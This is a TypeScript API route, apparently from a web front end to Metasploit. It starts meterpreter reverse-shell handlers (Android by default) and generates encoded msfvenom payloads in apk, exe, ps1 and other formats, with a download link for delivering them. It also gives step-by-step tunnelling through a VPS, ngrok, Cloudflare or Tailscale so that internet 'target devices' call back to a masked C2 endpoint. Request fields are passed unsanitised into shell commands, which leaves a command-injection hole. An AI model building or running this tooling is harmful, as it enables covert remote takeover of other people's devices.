/**
 * SETUP API — End-to-end connection wizard.
 *
 * GET  ?action=status         → current setup status (listeners, LHOST, ports)
 * GET  ?action=network        → detected IPs (Tailscale, LAN, public)
 * POST {action:"start_listener", payload, lhost, lport}  → start MSF handler
 * POST {action:"stop_listener", jobId}                   → stop a handler
 * POST {action:"generate",  payload, lhost, lport, format, encoder, iterations} → msfvenom
 * POST {action:"connect_kali"}                           → attach Kali container to MSF network
 * POST {action:"vps_relay", vpsHost, vpsUser, vpsPort}  → test VPS SSH relay instructions
 */

import { NextResponse } from "next/server";
import { getRpcToken, rpcCall } from "@/lib/msf-rpc";
import { getMsfConfig } from "@/lib/msf-config";
import { exec } from "child_process";
import { promisify } from "util";
import path from "path";
import fs from "fs";
import os from "os";

const execAsync = promisify(exec);
const PAYLOADS_DIR = process.env.PAYLOADS_DIR ?? path.join(os.homedir(), "msf-payloads");

function ensureDir(d: string) { if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true }); }

// ── IP detection ──────────────────────────────────────────────────────────────
async function detectIPs(): Promise<{
  tailscale: string | null;
  lan: string | null;
  publicIp: string | null;
  dockerBridge: string | null;
}> {
  const result = { tailscale: null as string | null, lan: null as string | null, publicIp: null as string | null, dockerBridge: null as string | null };

  // Tailscale IP (100.x.x.x range)
  try {
    const { stdout } = await execAsync("tailscale ip 2>/dev/null || ip addr show | grep '100\\.' | awk '{print $2}' | cut -d/ -f1 | head -1");
    const match = stdout.match(/100\.\d+\.\d+\.\d+/);
    if (match) result.tailscale = match[0];
  } catch { /* skip */ }

  // LAN IP
  try {
    const { stdout } = await execAsync("ipconfig getifaddr en0 2>/dev/null || hostname -I 2>/dev/null | awk '{print $1}'");
    const match = stdout.trim().match(/\d+\.\d+\.\d+\.\d+/);
    if (match && !match[0].startsWith("100.")) result.lan = match[0];
  } catch { /* skip */ }

  // Public IP
  try {
    const res = await fetch("https://api.ipify.org?format=json", { signal: AbortSignal.timeout(5000) });
    const data = await res.json() as { ip: string };
    result.publicIp = data.ip;
  } catch { /* skip */ }

  // Docker bridge gateway (host IP seen from containers)
  try {
    const { stdout } = await execAsync("docker network inspect metasploit-app_default --format '{{range .IPAM.Config}}{{.Gateway}}{{end}}' 2>/dev/null");
    if (stdout.trim()) result.dockerBridge = stdout.trim();
  } catch { /* skip */ }

  return result;
}

// ── MSF listener management ───────────────────────────────────────────────────
async function getActiveJobs(token: string) {
  try {
    const jobs = await rpcCall<Record<string, { name: string; datastore?: Record<string, unknown> }>>(
      "job.list", [], token
    );
    return Object.entries(jobs).map(([id, job]) => ({
      id, name: job.name, datastore: job.datastore,
    }));
  } catch {
    return [];
  }
}

// ── GET ───────────────────────────────────────────────────────────────────────
export async function GET(request: Request) {
  const url = new URL(request.url);
  const action = url.searchParams.get("action") ?? "status";

  const config = getMsfConfig();

  if (action === "network") {
    const ips = await detectIPs();
    return NextResponse.json({
      ...ips,
      tailscaleDevices: null, // populated from tailscale CLI if available
      recommended: ips.tailscale ?? ips.lan ?? ips.publicIp ?? "127.0.0.1",
    });
  }

  if (action === "status") {
    const ips = await detectIPs();
    let jobs: { id: string; name: string; datastore?: Record<string, unknown> }[] = [];
    let msfConnected = false;

    if (!config.demoMode) {
      try {
        const token = await getRpcToken();
        jobs = await getActiveJobs(token);
        msfConnected = true;
      } catch { /* offline */ }
    }

    // Check if listener port is actually reachable
    const listenerPort = Number(process.env.LPORT ?? 4444);
    let portOpen = false;
    try {
      await execAsync(`nc -z -w 2 127.0.0.1 ${listenerPort} 2>/dev/null`);
      portOpen = true;
    } catch { /* closed */ }

    // Check Kali is on MSF network
    let kaliConnected = false;
    try {
      const { stdout } = await execAsync(
        "docker network inspect metasploit-app_default --format '{{json .Containers}}' 2>/dev/null"
      );
      kaliConnected = stdout.includes('"kali"') || stdout.includes("kali");
    } catch { /* skip */ }

    return NextResponse.json({
      msfConnected,
      demoMode: config.demoMode,
      ips,
      recommended_lhost: ips.tailscale ?? ips.lan ?? "127.0.0.1",
      activeHandlers: jobs.filter((j) => j.name?.includes("handler") || j.name?.includes("Handler")),
      activeJobCount: jobs.length,
      listenerPort,
      portOpen,
      kaliOnMsfNetwork: kaliConnected,
      readyToReceive: msfConnected && jobs.length > 0 && portOpen,
      checklist: [
        { item: "MSF RPC connected",     done: msfConnected },
        { item: "Handler running",       done: jobs.length > 0 },
        { item: "Listener port open",    done: portOpen },
        { item: "Kali on MSF network",   done: kaliConnected },
        { item: "LHOST detected",        done: !!(ips.tailscale ?? ips.lan) },
      ],
    });
  }

  return NextResponse.json({ error: "Unknown action" }, { status: 400 });
}

// ── POST ──────────────────────────────────────────────────────────────────────
export async function POST(request: Request) {
  const body = await request.json() as Record<string, unknown>;
  const action = body.action as string;
  const config = getMsfConfig();

  // ── Start MSF listener ─────────────────────────────────────────────────────
  if (action === "start_listener") {
    const payload  = (body.payload  as string) ?? "android/meterpreter/reverse_tcp";
    const lhost    = (body.lhost    as string) ?? "0.0.0.0";
    const lport    = Number(body.lport ?? 4444);
    const persist  = body.persist !== false;

    if (config.demoMode) {
      return NextResponse.json({
        ok: true, demo: true, jobId: "demo-1",
        message: `DEMO: Handler for ${payload} on ${lhost}:${lport} would start here`,
      });
    }

    try {
      const token = await getRpcToken();

      // Create a console and run the handler
      const created = await rpcCall<{ id: string | number }>("console.create", [], token);
      const cid = String(created.id ?? "0");

      // Small banner drain
      await new Promise((r) => setTimeout(r, 1500));
      await rpcCall("console.read", [cid], token);

      const cmds = [
        "use exploit/multi/handler",
        `set PAYLOAD ${payload}`,
        `set LHOST ${lhost}`,
        `set LPORT ${lport}`,
        "set ExitOnSession false",
        `run -j${persist ? " -z" : ""}`,
      ];

      let output = "";
      for (const cmd of cmds) {
        await rpcCall("console.write", [cid, cmd + "\n"], token);
        await new Promise((r) => setTimeout(r, 600));
        const res = await rpcCall<{ data?: string; busy?: boolean }>("console.read", [cid], token);
        output += res.data ?? "";
      }

      // Wait for handler to start
      await new Promise((r) => setTimeout(r, 1500));
      const finalRead = await rpcCall<{ data?: string }>("console.read", [cid], token);
      output += finalRead.data ?? "";

      // Get the job ID
      const jobs = await getActiveJobs(token);
      const handlerJob = jobs.find((j) => j.name?.toLowerCase().includes("handler"));

      // Destroy console
      try { await rpcCall("console.destroy", [cid], token); } catch { /* ok */ }

      return NextResponse.json({
        ok: true, jobId: handlerJob?.id ?? null,
        payload, lhost, lport,
        output: output.trim().slice(-500),
        activeJobs: jobs.length,
      });
    } catch (err) {
      return NextResponse.json({ error: String(err) }, { status: 500 });
    }
  }

  // ── Stop MSF listener ──────────────────────────────────────────────────────
  if (action === "stop_listener") {
    const jobId = String(body.jobId ?? "");
    if (!jobId) return NextResponse.json({ error: "jobId required" }, { status: 400 });

    if (config.demoMode) {
      return NextResponse.json({ ok: true, demo: true, message: "DEMO: job stopped" });
    }

    try {
      const token = await getRpcToken();
      await rpcCall("job.stop", [jobId], token);
      return NextResponse.json({ ok: true, jobId });
    } catch (err) {
      return NextResponse.json({ error: String(err) }, { status: 500 });
    }
  }

  // ── Generate payload with msfvenom ─────────────────────────────────────────
  if (action === "generate") {
    const payload    = (body.payload   as string) ?? "android/meterpreter/reverse_tcp";
    const lhost      = (body.lhost     as string) ?? "127.0.0.1";
    const lport      = Number(body.lport ?? 4444);
    const format     = (body.format    as string) ?? "raw";
    const encoder    = (body.encoder   as string | undefined);
    const iterations = Number(body.iterations ?? 1);
    const filename   = (body.filename  as string | undefined);

    ensureDir(PAYLOADS_DIR);

    // Determine output file extension
    const extMap: Record<string, string> = {
      apk: ".apk", exe: ".exe", elf: ".elf", psh: ".ps1",
      raw: ".bin", jar: ".jar", war: ".war", py: ".py",
      "psh-reflection": ".ps1", "psh-cmd": ".ps1",
    };
    const ext = extMap[format] ?? `.${format}`;
    const outName = filename ?? `payload_${payload.replace(/\//g, "_")}_${lport}${ext}`;
    const outPath = path.join(PAYLOADS_DIR, outName);

    // Build msfvenom command — runs inside the MSF container
    let venom = `msfvenom -p ${payload} LHOST=${lhost} LPORT=${lport} -f ${format}`;
    if (encoder) venom += ` -e ${encoder} -i ${iterations}`;
    venom += ` -o /payloads/${outName}`;

    if (config.demoMode) {
      return NextResponse.json({
        ok: true, demo: true,
        message: `DEMO — would run: ${venom}`,
        command: venom, filename: outName,
      });
    }

    try {
      const { stdout, stderr } = await execAsync(
        `docker exec metasploit-rpc bash -c "${venom.replace(/"/g, '\\"')}" 2>&1`,
        { timeout: 120000 }
      );
      const combinedOut = (stdout + stderr).trim();
      const success = !combinedOut.includes("Error") && !combinedOut.includes("error:");

      // Copy from Docker volume to host PAYLOADS_DIR if needed
      let fileSize = 0;
      try {
        await execAsync(`docker cp metasploit-rpc:/payloads/${outName} ${outPath}`);
        fileSize = fs.statSync(outPath).size;
      } catch { /* volume may already sync it */ }

      return NextResponse.json({
        ok: success, command: venom, output: combinedOut.slice(-400),
        filename: outName, path: outPath, size: fileSize,
        deliveryUrl: `/api/embed/download?file=${encodeURIComponent(outName)}`,
      });
    } catch (err) {
      return NextResponse.json({ error: String(err) }, { status: 500 });
    }
  }

  // ── Connect Kali to MSF network ─────────────────────────────────────────────
  if (action === "connect_kali") {
    try {
      const { stdout } = await execAsync(
        "docker network connect metasploit-app_default kali 2>&1 || echo 'already connected'"
      );
      return NextResponse.json({ ok: true, output: stdout.trim() });
    } catch (err) {
      return NextResponse.json({ error: String(err) }, { status: 500 });
    }
  }

  // ── VPS relay instructions ─────────────────────────────────────────────────
  if (action === "vps_relay") {
    const vpsHost = (body.vpsHost as string) ?? "your-vps-ip";
    const vpsUser = (body.vpsUser as string) ?? "root";
    const lport   = Number(body.lport ?? 4444);

    const instructions = {
      method: "SSH Reverse Tunnel",
      description: "Forward the MSF listener through a VPS so internet devices can connect without Tailscale",
      steps: [
        {
          step: 1,
          title: "On your VPS — allow GatewayPorts",
          command: `echo "GatewayPorts yes" >> /etc/ssh/sshd_config && systemctl restart sshd`,
        },
        {
          step: 2,
          title: "On your Mac — open tunnel (keep terminal open)",
          command: `ssh -N -R 0.0.0.0:${lport}:127.0.0.1:${lport} ${vpsUser}@${vpsHost}`,
          note: "This forwards VPS:4444 → your Mac:4444 → MSF container"
        },
        {
          step: 3,
          title: "Generate payload with VPS IP as LHOST",
          command: `LHOST=${vpsHost} LPORT=${lport}`,
          note: `The payload will call back to ${vpsHost}:${lport}, which SSH tunnels to your MSF listener`
        },
        {
          step: 4,
          title: "Auto-reconnect SSH tunnel (persistent)",
          command: `autossh -M 0 -N -R 0.0.0.0:${lport}:127.0.0.1:${lport} ${vpsUser}@${vpsHost}`,
          note: "Install autossh: brew install autossh"
        },
      ],
      alternatives: [
        {
          name: "ngrok (easiest)",
          command: `ngrok tcp ${lport}`,
          note: "Free tier: ngrok gives you a random TCP address like tcp://0.tcp.ngrok.io:12345. Use that as LHOST:LPORT.",
          limitation: "URL changes every session. Need ngrok account for static address."
        },
        {
          name: "Cloudflare Tunnel",
          command: `cloudflared tunnel --url tcp://localhost:${lport}`,
          note: "Free, persistent, works through any firewall"
        },
        {
          name: "Tailscale (BEST — already installed)",
          command: `LHOST=100.120.150.28 LPORT=${lport}`,
          note: "Use your Tailscale IP as LHOST so the C2 callback routes through your encrypted Tailscale mesh — target devices on the open internet connect back to your masked entry point.",
          important: true
        },
      ]
    };

    return NextResponse.json(instructions);
  }

  return NextResponse.json({ error: "Unknown action" }, { status: 400 });
}
